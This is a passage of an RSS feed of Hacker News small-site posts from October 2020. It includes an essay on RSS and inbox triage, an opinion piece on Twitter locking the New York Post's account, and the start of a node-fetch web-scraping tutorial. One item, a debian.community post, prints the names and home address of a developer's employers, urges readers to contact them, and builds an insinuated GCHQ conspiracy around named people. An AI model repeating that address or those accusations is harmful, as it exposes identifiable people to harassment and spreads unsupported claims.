            <guid isPermaLink="false">hacker-news-small-sites-24900217</guid>
            <pubDate>Mon, 26 Oct 2020 19:29:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Comparing IP Address Geolocation API Services]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24899981">thread link</a>) | @BigBalli
<br/>
October 26, 2020 | http://giacomoballi.com/blog/comparing-ip-address-geolocation-api-services | <a href="https://web.archive.org/web/*/http://giacomoballi.com/blog/comparing-ip-address-geolocation-api-services">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://giacomoballi.com/blog/comparing-ip-address-geolocation-api-services</link>
            <guid isPermaLink="false">hacker-news-small-sites-24899981</guid>
            <pubDate>Mon, 26 Oct 2020 19:11:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unexpected, Useless, and Urgent, or What RSS Gets Right]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 57 (<a href="https://news.ycombinator.com/item?id=24899256">thread link</a>) | @whatrocks
<br/>
October 26, 2020 | https://www.charlieharrington.com/unexpected-useless-and-urgent | <a href="https://web.archive.org/web/*/https://www.charlieharrington.com/unexpected-useless-and-urgent">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h4>Or, What RSS Gets Right</h4>
<p>Abraham Lincoln once said, "<a href="https://en.wikipedia.org/wiki/Marshall_McLuhan">The medium is the message</a>. And San Francisco summers are cold af."</p>
<p>Putting that aside, I've been thinking a lot (uh-oh) about why I like opening up my RSS reader app so much. And I'm not <em>just</em> talking about its looks, even though it's super cute (I'm using the free, open-source, and all-around neato <a href="https://ranchero.com/netnewswire/">NetNewsWire</a> for my RSS needs).</p>
<p>No, I'm talkin' about them RSS <em>feels</em>.</p>
<p>Why does using opening my RSS inbox feel so much better than typing in gmail.com or tapping the iMessages icon or, heavens forbid, opening up Twitter?</p>
<p>With my sweet-sweet RSS, there's no anxiety. There's no guilt. In our time-tracking Screen Time home screen widget era, there's almost a baccanalian decadance to sifting through an RSS inbox, like watching honey drip from one of those wooden combs in a cereal commercial. Or -- back when we were allowed -- going to the library and reading the newspaper from those weird wooden dowels.</p>
<p>It should go without saying that this feeling does not extend to the other inboxen in my life. And I'd like to understand why -- and see if I can do anything about it.</p>
<h2>A framework for messages</h2>
<p>Butchering some data pipeline terms, let's define an inbox (e.g. email, social media, text messages, RSS, phone calls) as a sink for messages from various data providers, where these messages wait for human-in-the-loop processing (in this case, you).</p>
<p>O! Ye of little time! How are you meant to evaluate the "importance" of a given message? Let's explore that across two vectors: (1) prior awareness of the message's sender and (2) usefulessness of the message contents.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/a1792/msggrid.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="grid" title="grid" src="https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/a6d36/msggrid.png" srcset="https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/222b7/msggrid.png 163w,
https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/ff46a/msggrid.png 325w,
https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/a6d36/msggrid.png 650w,
https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/a1792/msggrid.png 780w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>The sweet-spot is that upper row: useful messages from both "people we know" and "people we don't know." Whereas if you're in the bottom row, you're gonna have a bad time: useless messages are never... useful.</p>
<h4>Filtering on sender</h4>
<p>The bottom right quadrant is easy to visualize: robo-calls about your non-existent car's expired warranty, social media ads, junk mailers in your meatspace mailbox. </p>
<p>You might think, perhaps, that we can use the "Expected Sender" vs "Unexpected Sender" filter to avoid this quadrant. In fact, this is what Apple allows you to do with the new <a href="https://support.apple.com/en-us/HT207099#:~:text=To%20turn%20on%20Silence%20Unknown,in%20your%20recent%20calls%20list.">Silence Unknown Callers</a> feature in iOS 14 (which doesn't actually prevent the calls, but immediately sends unknown calls to the dead-letter queue that is your voicemailbox).</p>
<p>The problem with this blunt approach of dead-letter queueing the right column is that you're going to miss the serendipity of the upper right quadrant: calls from unexpected sources with useful information. Given <a href="https://www.charlieharrington.com/colon-cancer">my recent cancer diagnosis</a>, I've had tons of important, useful calls from unknown numbers every single day, from doctors and the like -- calls that I want to triage quickly. Sending all calls from unknown numbers straight to voicemail would just be yet another inbox to maintain. Worse, I might miss something important in the upper right quadrant.</p>
<p>A lighter touch approach here is to auto-classify your messages into buckets based on sender. Gmail now does this with their "Primary", "Social", and "Promotion" tabs. Everything's still "in your inbox", but now you can usually just "Select all" on that Promotion tab and safely send those messages straight to the netherworld.</p>
<p>The bottom left quadrant is where your unique lifeforce is slowly chipped away, doomscrolling through your high school classmates' life updates or, gasp, political views. Don't get me wrong -- I really enjoy Instagram and it makes me happy to see people I know doing cool, cute stuff. But I know it can get real bad in this quadrant real quick. Unfollowing and/or muting is key here.</p>
<h4>Filtering on content</h4>
<p>Okay, so, if filtering on sender alone doesn't work, can we use the message contents to figure out if a given message is going to be useful?</p>
<p>We're now talking about <em>pre-processing</em> the messages in our queues.</p>
<p>In the days of future past, you might have employed a staffer to "sort through your office mailbox" to do this. How very Don Draper of you. But in today's era of secure password managers and 2FA, we ideally don't have <em>that many</em> other people in our digital inboxes. The inbox providers are aware of this, and they're starting to provide some tools to help here -- as long as you're okay with them "reading" your messages.</p>
<p>Gmail, for example, has gotten pretty darn good at spam detection. They're "reading your emails" and dropping the bad ones into your "spam folder" dead-letter queue. Maybe, once in a blue moon, they false-positive something that you have to go spelunking into that elephant graveyard to find. But I'm never annoyed by this, because when I see absolute garbage that they've blocked for me day-in and day-out, I'm hashtag grateful again.</p>
<p>This approach, however, isn't possible with all mediums. There's no way to pre-filter on content for an incoming phone-call, for example.</p>
<p>And the tradeoff in pre-filtering on content is, of course, privacy. </p>
<p>If you're down for your inbox provider to "scan" your messages, then they can potentially start to do some smart stuff, like "bubbling up" useful messages or getting rid of bottom row crud.</p>
<p>But, more likely than not, they're also reading them for another purpose.</p>
<h4>The cost of free</h4>
<p>Many of these inbox platforms are free (e.g. social media, Gmail), and someone's gotta pay to keep that spam algorithm ticking. And that someone is you.</p>
<p>Most ads are squarely in the bottom right quadrant. "Good" ads -- I'm talking about those Instagram candles you keep converting on -- are upper right quadrant. The platforms do their darndest to make sure their ads are as upper-right as possible, but they can't guarantee that. YouTube keeps asking me my age because it's genuinely confused as to why my viewing habits fluctuate between watching someone clean old Apple II and VIC-20 computers and the latest Super Mario 3 speed-runs. </p>
<p>And, c'mon, I'd rather just not ever see ads in the first place.</p>
<p>Okay, tough guy. Are you willing to pay for an ad-free inbox then?</p>
<p>Maybe? Ugh. Yes, there's a bunch of new players in the space who are emphasizing privacy and going ad-free. But am I going to willingly add yet another recurring subscription to my life? The Mandalorian is about to come back, and I'm already bracing for the impending Disney+ subscription. </p>
<p>I'll come back to this, because our analysis is still missing two important features.</p>
<h2>A framework for inboxen</h2>
<p>So, far we've only explored the features of an individual message -- not the nature of an inbox itself.</p>
<p>Regardless of an individual message's usefuless or your prior awareness of its sender, an inbox has two other important features that contribute to our mental well-being: (1) typical message volume and (2) expected urgency of triage.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/2e195/inboxgrid.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="inbox" title="inbox" src="https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/a6d36/inboxgrid.png" srcset="https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/222b7/inboxgrid.png 163w,
https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/ff46a/inboxgrid.png 325w,
https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/a6d36/inboxgrid.png 650w,
https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/2e195/inboxgrid.png 782w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>The message volume thing is straightforward. Some platforms have a never-ending feed of messages that you can "enjoy," others not so much.</p>
<p>At the same time, each inbox medium connotes a inherent sense of urgency. <strong>The medium is the madness</strong>, if you will. No matter what the message says or who sends it, there's a differentiated inbox-level "urgency punch" to your lizard brain whenever any single message (spam or not) comes flying in.</p>
<p>Let's be more specific with some typical inboxes in our lives:</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/f941f/inboxoverlay.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="inbox overlay" title="inbox overlay" src="https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/a6d36/inboxoverlay.png" srcset="https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/222b7/inboxoverlay.png 163w,
https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/ff46a/inboxoverlay.png 325w,
https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/a6d36/inboxoverlay.png 650w,
https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/f941f/inboxoverlay.png 736w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>Phone calls are just about as "urgent" as it gets. Prior to iOS 14, phone calls used to interrupt whatever you were doing, taking up your iPhone's entire screen real estate. Doesn't get more urgent-y than that! Luckily, calls are relatively sparse compared to text messages, which you still need to respond to, but you can "put them on ice" for days at a time with a high-degree of cultural acceptance.</p>
<p>Social media messages are legion in terms of volume. And, while they're not especially urgent from an innate message-level perspective, the platforms do their darndest to "notify" you of "engagement opportunities" to keep you locked-in, so these inboxes fall in the semi-urgent category in my book.</p>
<p>Onto RSS -- my beautiful, dark, twisted RSS. There's truly zero urgency here and relatively few messages (writing blog posts is time-consuming!). Moreover, returning to our message evaluation framework, an RSS inbox only contains messages from known senders, since you've explicitly had to add their RSS feeds to your feed-roll. And, since you've likely done that because you expect to value the contents of their messages, you're likely living in the upper left quadrant in RSS-land, enjoying that drizzled honey and those weird-newspaper rolls.</p>
<p>Email is the real challenge-tunity here.</p>
<h3>Stuck in the Middle With You</h3>
<p>Email is caught in the middle of all these features, both message-level and inbox-level. Anyone can email you at any time with any message, so there's a ton of it, and any message may be useful and/or urgent. That's mostly a good thing, and probably our RFC-writing forerunners wanted it that way.</p>
<p>Thus, we check our email, prodigiously, every single day. All day long. While we're pooping, while we're Zooming, while we're doing any old thing.</p>
<p>Perhaps this is a lens on why newsletters are making a comeback. Email readers are a "captive audience," because we cannot avoid triaging our email inboxes. As long as publishers keep their newsletters top-row-level useful, we'll keep Substacking them. Certainly, the chances of me reading an email newsletter are greater than they would be if I had to visit individual blogs. However, I think my ideal for premium content would be paid RSS feeds, rather than email newsletters, because I want to keep my email inbox clean as possible to aid in my triaging. In fact, this is what many podcasts are now doing (since podcasts are just noisy RSS feeds).</p>
<p>OK, enough about content-monetization (have I mentioned I have a free newsletter below?). How can we make our email inbox <em>feel</em> better? Is it possible to make email feel as good as RSS?</p>
<p>First, we should establish principles-slash-goals for each quadrant in our Conjoined Box of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.charlieharrington.com/unexpected-useless-and-urgent">https://www.charlieharrington.com/unexpected-useless-and-urgent</a></em></p>]]>
            </description>
            <link>https://www.charlieharrington.com/unexpected-useless-and-urgent</link>
            <guid isPermaLink="false">hacker-news-small-sites-24899256</guid>
            <pubDate>Mon, 26 Oct 2020 18:18:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Twitter still hasn't unlocked the New York Post's account]]>
            </title>
            <description>
<![CDATA[
Score 623 | Comments 695 (<a href="https://news.ycombinator.com/item?id=24899186">thread link</a>) | @dsaavy
<br/>
October 26, 2020 | https://www.melovedata.com/twitter-still-hasnt-unlocked-the-new-york-posts-account/ | <a href="https://web.archive.org/web/*/https://www.melovedata.com/twitter-still-hasnt-unlocked-the-new-york-posts-account/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<div>
<div>
<p><strong>Related Article: <a href="https://www.melovedata.com/what-could-the-polls-be-missing-in-this-presidential-election/" target="_blank" rel="noreferrer noopener">What could polls be missing for this election?</a></strong></p>



<p><em>Disclaimer: I’m a registered voter with no party affiliation. I have a personal interest in tracking major news networks such as CNN, Fox News, Breitbart, the New York Times, and other outlets who publish misleading information since 2008. Twitter is a recent example of a large, influential medium that has now subjectively interfered with information flow to the public.</em></p>



<p>It has been over 10 days since the famous <a href="https://nypost.com/2020/10/14/hunter-biden-emails-show-leveraging-connections-with-dad-to-boost-burisma-pay/" target="_blank" rel="noreferrer noopener">New York Post story</a> discussing Hunter Biden’s activities with the Ukranian energy firm Burisma. Twitter reacted by locking the New York Post’s Twitter account from any activity, citing they were trying to prevent the spread of hacked information. Twitter CEO Jack Dorsey admits <a href="https://variety.com/2020/digital/news/twitter-ceo-nypost-block-wrong-hacked-materials-policy-1234807399/" target="_blank" rel="noreferrer noopener">blocking the story was a mistake</a> and ended up reallowing the sharing of the story on Twitter.</p>



<h3>Then one must ask, <em>why is the New York Post’s Twitter account still locked?</em></h3>



<p>If the decision was reversed, why isn’t the New York Post’s account unlocked? Why isn’t the New York Times account locked due to releasing Trump’s tax returns that were clearly stolen or “hacked”? Especially after the New York Times declined to share their evidence? Here’s a quote from the NYT article where they decline to share:</p>



<blockquote><p>“…Alan Garten, a lawyer for the Trump Organization, said that “most, if not all, of the facts appear to be inaccurate” and requested the documents on which they were based. After The Times declined to provide the records, in order to protect its sources…”</p><cite>https://www.nytimes.com/interactive/2020/09/27/us/donald-trump-taxes.html</cite></blockquote>



<p>So no records have been released “in order to protect sources”, which isn’t an explanation as to why the actual documents haven’t been published. You can publish tax returns without exposing your sources (for an example, look at <a href="https://wikileaks.org/" target="_blank" rel="noreferrer noopener">all of the WikiLeaks releases</a> over time). Ironically, by publishing the tax returns, you’ll force the hand of Trump to actually release his returns. Instead, all we have is the NYT claiming to have records that they won’t show and have obtained without permission.<strong> So why is the New York Post account locked and the NYT account not?</strong> </p>



<h3>A speculation</h3>



<p>Maybe the answer lies in Twitter’s rules and policies, which <a href="https://help.twitter.com/en/rules-and-policies/public-interest" target="_blank" rel="noreferrer noopener">give plenty of wiggle room</a> by utilizing “exceptions” that they alone determine is best for the public interest. Apparently unverified and unreleased tax returns are important for the public interest, but direct evidence of high-ranking US politician’s family member <a href="https://twitter.com/TrumpWarRoom/status/1196831901597806599?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1196831901597806599%7Ctwgr%5Eshare_3%2Ccontainerclick_1&amp;ref_url=https%3A%2F%2Fwww.breitbart.com%2Fpolitics%2F2019%2F11%2F19%2Fbackfire-vindman-admits-hunter-biden-seemed-unqualified-for-burisma-role%2F" target="_blank" rel="noreferrer noopener">receiving a highly paid position without prior credentials</a> is not of concern to the American public. </p>



<p>Maybe it turns out that Twitter is in fact biased? Considering it’s difficult, if not impossible for a human being to truly be entirely objective, Twitter’s review units are undoubtedly biased themselves since they’re made up of humans. Should there be insights into who makes up the committees that Twitter uses to review posts and their potential biases? Either way, the main question is; why are they subjectively trying to change the flow of information to the American public?</p>



<p>You’ll have to come to your own conclusion on that. </p>



<h3>To be transparent, this is my opinion.</h3>



<p>Any institution (private or public) with the power to influence outcomes of anything at scale, are incentivized to take a side. Since humans make up these institutions, they are inherently biased, no matter how hard they try to be unbiased. The resulting bias from the institution’s parts eventually come through as the bias of the whole institution. It’s inevitable and unavoidable, and this is what we’re seeing on Twitter’s decision to lock the New York Post’s account but not the New York Times.</p>



<p>The New York Post should be able to post their own articles without limitation unless other media outlets are restricted as well (such as BuzzFeed news). Unless every single news article is researched by a transparent committee with their justification on blocking/allowing it, one side will always benefit. </p>
</div>



<div>


	<div data-blog-id="177716820">
		<div>
			
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
	</div>
</div>



<hr>



<p>Usually I write about data stuff, but sometimes I write articles like these. Subscribe if you want to get notifications of new articles!</p>



	<div data-blog-id="177716820">
		<div>
			
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
	

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://www.melovedata.com/twitter-still-hasnt-unlocked-the-new-york-posts-account/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24899186</guid>
            <pubDate>Mon, 26 Oct 2020 18:12:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GCHQ Link to Debian Analyzed]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24898936">thread link</a>) | @dcnews
<br/>
October 26, 2020 | https://debian.community/jonathan-wiltshire-debian-falsified-harassment-claims-tiger-computing-gchq/ | <a href="https://web.archive.org/web/*/https://debian.community/jonathan-wiltshire-debian-falsified-harassment-claims-tiger-computing-gchq/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <a href="https://debian.community/jonathan-wiltshire-debian-falsified-harassment-claims-tiger-computing-gchq/"></a>
  <hr>
  <time>Oct 26, 2020</time>
  <img width="33%" alt="Jonathan Wiltshire, jmw, Debian, GCHQ, DAM, blackmail" src="https://debian.community/assets/jonathan-wiltshire-1.png">
<p>With the Special Boat Service (SBS), cousins of the SAS, <a href="https://www.theguardian.com/uk-news/2020/oct/25/what-do-we-know-about-the-sbs">storming a ship in the English channel</a>, we feel it is a good time to finally have a look at another DAM <a href="https://debian.community/debian-blackmail-thought-reform-quickstart/">blackmailer</a> and Debian's potential connections to GCHQ.</p>

<p>Jonathan Wiltshire (jmw) works for a small IT firm, <a href="https://www.tiger-computing.co.uk/about-us/team/">Tiger Computing</a> in Monmouth, one of those small unremarkable towns in the Welsh countryside that most of us have never heard of.</p>

<p>We can see that abusive messages have been sent to Debian volunteers during UK business hours and Debian is <a href="https://www.tiger-computing.co.uk/about-us/team/">promoted on the Tiger Computing staff profile</a>.  Debian itself is not incorporated.  Therefore, we feel that it is relevant to consider both Wiltshire and his employer.</p>

<p>Britain is known to have a <a href="https://en.wikipedia.org/wiki/English_defamation_law">tough stance on defamation</a> and any volunteer who has been subject to false accusations would have a strong case under UK law against both Wiltshire and Tiger Computing.  Companies House provides <a href="https://find-and-update.company-information.service.gov.uk/company/03389961/officers">full details of the legal address for service</a>.</p>

<p>If Wiltshire and his DAMs intrude upon your family's Christmas, as they did to two volunteers in 2018, you can contact Wiltshire's boss directly.  We obtained the following names and address from the public company records:</p>

<p>Keith Andrew Edmunds and Dr Anna Cecilia Lindberg, Woodlands, Staunton, Coleford, <b>Gloucestershire</b>, GL16 8NU</p>

<p>We don't normally publish addresses in Debian Community News but in this case, there is a significant public interest factor.  Gloucestershire is the home of <a href="https://en.wikipedia.org/wiki/GCHQ">GCHQ</a>.  Various people have <a href="https://duckduckgo.com/?q=gchq+psyops+debian&amp;t=ffab&amp;ia=web">expressed concerns about GCHQ PsyOps in Debian and open source software</a>.  Each time somebody mentions this, they are censored from Planet sites and mailing lists.  Jacob Appelbaum had explicitly warned about GCHQ infiltration on the <a href="https://debian.community/debian-private-leaked/">debian-private (leaked) gossip network</a>.  In a way, Appelbaum was forecasting his own death, or in this case, the character assassination plot spreading <a href="https://duckduckgo.com/?q=debian+falsified+harassment&amp;t=ffab&amp;ia=web">falsified accusations of harassment</a>.</p>

<img src="https://debian.community/assets/appelbaum-predicted-death-debian-private.png">

<p>We've produced a convenient map showing the proximity of Tiger Computing to both Hereford, the SAS headquarters and Cheltenham, the GCHQ headquarters.</p>

<img src="https://debian.community/assets/debian-gchq-tiger-computing-conspiracy-theory.png">

<p>It is worth looking again at the email from Wiltshire's DAM buddy, Enrico Zini, <a href="https://danielpocock.com/debian-falsified-harassment-claims-appelbaum-expulsion/">fiercely decrying any possibility of a GCHQ infiltration</a>.</p>

<blockquote><em>
Subject: On coverage of Abbelbaum being "banned" from Debian<br>
Date: Wed, 22 Jun 2016 09:34:50 +0200<br>
From: Enrico Zini &lt;enrico@enricozini.org&gt;<br>
To: andrew.matler@itwire.com

<p>Dear Editor in Chief of iTWire,</p>

<p>you may want to do something about this article by Sam Varghese on
Debian revoking membership of Jacop Appelbaum:
http://www.itwire.com/business-it-news/open-source/73441-appelbaum-banned-from-debian-events-after-sexual-misconduct-charges.html</p>

<p><b>While the first part is factually correct in its DPL quote</b>, the article
ends with baseless hints of Debian and Tor having fallen victims to
manipulations by GCHQ psyops.</p>

<p>I consider that to be psycological violence[1] against the various well
known people who came out to report abuse, and I wish that news coverage
about this situation could rather contribute to creating a community
that encourages victims of abuse to speak up.</p>

<p>Quoting the DPL again, "In reaching their decision, the Debian Account
Managers took into account the public disclosures from members of the
Tor project and others, and <b>first-hand accounts from members of the
Debian community</b>."</p>

<p><b>We are not talking about vague rumors</b> spread by a couple of
infiltrators, we are talking about <b>first-person accounts</b> provided by
well known and respected members of both communities, with a track
record of contributions of many years.</p>

<p>These people who had the guts to speak up deserve credit and respect,
and the article published on your site gives them none.</p>

<p>[1] https://en.wikipedia.org/wiki/Gaslighting</p>

<p>Regards,</p>

<p>Enrico</p>
</em></blockquote>

<p>The first-hand accounts were nothing but hearsay.  On the other hand, the GCHQ connection is no conspiracy theory: it is matter of fact, if you are running one of the world's most well funded spy outfits and you <em>hadn't</em> infiltrated Debian, you wouldn't be doing your job properly.</p>

<p>British domestic police forces had been caught <a href="https://en.wikipedia.org/wiki/UK_undercover_policing_relationships_scandal">in similar games, infiltrating environment groups and making women pregnant</a>.</p>

<p>The SAS and SBS do some pretty incredible work.  Even the Australian commandos have chosen to use the name SAS because it has such a good reputation.</p>

<p>Nonetheless, like any organization, there are some bad apples.  A recently published book tells the story of former SAS heroes becoming mercenaries and <a href="https://www.dailymail.co.uk/news/article-7954259/New-book-tells-story-elite-band-ex-special-forces-wreaked-havoc-world.html">dropping grenades onto civilians from a helicopter</a>.  It is gruesome stuff.  From the article:</p>

<blockquote><em>Yet the victims were often women, children and the elderly — innocent civilians caught up in a brutal civil war that raged across the Indian Ocean state during the final decades of the 20th century.</em></blockquote>

<p>Now take a moment and compare this to the behaviour of Wiltshire and the Debian Account Managers, creating false accusations about volunteers and circulating them to over a thousand developers on the <a href="https://debian.community/debian-private-leaked/">debian-private (leaked) gossip network</a>.  In one case, Wiltshire, Zini and Jaspert threw one of these grenades at a volunteer and his family on Christmas eve.</p>

<p>It took the SBS less than 10 minutes to seize control of the ship in unpleasant weather on a Sunday afternoon.  Some of them even went back home in time to give their kids a bedtime story.  Would it really be any more difficult than that for GCHQ to infiltrate a free software project?</p>

<p><em>If you want more updates on this story, please <a href="https://uncensored.debian.community/">subscribe to the Uncensored version of Planet Debian</a> or <a href="https://uncensored.debian.community/rss20.xml">follow the RSS feed</a>.</em></p>

<img src="https://debian.community/assets/sbs-ship.jpg">


</article></div>]]>
            </description>
            <link>https://debian.community/jonathan-wiltshire-debian-falsified-harassment-claims-tiger-computing-gchq/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24898936</guid>
            <pubDate>Mon, 26 Oct 2020 17:51:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Web Scraping with JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 174 | Comments 87 (<a href="https://news.ycombinator.com/item?id=24898016">thread link</a>) | @paulpro
<br/>
October 26, 2020 | https://qoob.cc/web-scraping/ | <a href="https://web.archive.org/web/*/https://qoob.cc/web-scraping/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure>
    <span>
      <a href="https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/627f4/main.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="WALL-E holding logos of node and javascript in his hands" title="Brief overview of what we gonna do today" src="https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/80e3c/main.jpg" srcset="https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/4ec73/main.jpg 180w,
https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/158ba/main.jpg 360w,
https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/80e3c/main.jpg 720w,
https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/627f4/main.jpg 810w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Brief overview of what we gonna do today</figcaption>
  </figure>
<p>If you’ll try to google “web scraping tutorial” you’ll get a bunch of tech articles on the subject that tells you how to achieve the result using python. The toolkit is pretty standard for these posts: python 3 (hopefully not second) as an engine, requests library for fetching, and Beautiful Soup 4 (which is 6 years old) for web parsing.</p>
<p><em>I’ve also seen few articles where they teach you how to parse HTML content with regular expressions, spoiler: <a href="https://stackoverflow.com/a/1732454/7668392">don’t do this</a>.</em>
</p><figure>
    <span>
      <a href="https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/966c1/web-scraping-google.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Google results for 'web scraping tutorial'" title="Google results for 'web scraping tutorial'" src="https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/37523/web-scraping-google.png" srcset="https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/e9ff0/web-scraping-google.png 180w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/f21e7/web-scraping-google.png 360w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/37523/web-scraping-google.png 720w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/302a4/web-scraping-google.png 1080w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/07a9c/web-scraping-google.png 1440w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/966c1/web-scraping-google.png 1694w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Google results for 'web scraping tutorial'</figcaption>
  </figure>
<p>The problem is that I’ve seen articles like this 5 years ago and this stack hasn’t mostly changed. And more importantly, the solution is not native to javascript developers. If you would like to use technologies you are more familiar with, like ES2020, node, and browser APIs you will miss the direct guidance.</p>
<p>I’ve tried to fill the spot and create ‘the missing doc’.</p>
<h2>Overview</h2>
<blockquote>
<h4>Check if data is available in request</h4>
<p>Before you will start to do any of the programming, always check for the easiest available way. In our case, it would be a direct network request for data.</p>
<p>Open developer tools - F12 in most browsers - then switch to the <code>Network</code> tab and reload the page</p>
<p>If data is not baked in the HTML like it is in half of the modern web applications, there is a good chance that you don’t need to scrape and parse at all.
</p><figure>
    <span>
      <a href="https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/5b503/9gag-trending.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Response of browser network request to 9gag'" title="Here 9gag is providing us all the post data in convenient format" src="https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/37523/9gag-trending.png" srcset="https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/e9ff0/9gag-trending.png 180w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/f21e7/9gag-trending.png 360w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/37523/9gag-trending.png 720w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/302a4/9gag-trending.png 1080w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/07a9c/9gag-trending.png 1440w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/5b503/9gag-trending.png 1976w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Here 9gag is providing us all the post data in convenient format</figcaption>
  </figure>
</blockquote>
<p>If you are not so lucky and still need to do the scraping, here is the general overview of the process:</p>
<ol>
<li>fetch the page with the required data</li>
<li>extract the data from the page markup to some in-language structure (Object, Array, Set)</li>
<li>process the data: filter it, transform it to your needs, prepare it for the future usage</li>
<li>save the data: write it to the database or dump it to the filesystem</li>
</ol>
<p>That would be the easiest case for parsing, in sophisticated ones you can bump into some pagination, link navigation, dealing with bot protection (captcha), and even real-time site interaction. But all this wouldn’t be covered in the current guide, sorry.</p>
<h2>Fetching</h2>
<p>As an example of this guide, we will scrape a goal data for Messi from Transfermarkt. You can check his stats <a href="https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1">on the site</a>. To load the page from the node environment you will need to use your favorite request library. You can also use the raw HTTP/S module, but it doesn’t even support async, so I’ve picked <a href="https://github.com/node-fetch/node-fetch"><code>node-fetch</code></a> for this task. Your code will look something like:</p>
<div data-language="js"><pre><code><span>const</span> fetch <span>=</span> <span>require</span><span>(</span><span>'node-fetch'</span><span>)</span>

<span>const</span> <span>DATA_URL</span> <span>=</span>
  <span>'https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1'</span>
<span>const</span> <span>loadMessiGoals</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> response <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>DATA_URL</span><span>)</span>
  <span>return</span> response<span>.</span><span>text</span><span>(</span><span>)</span>
<span>}</span>

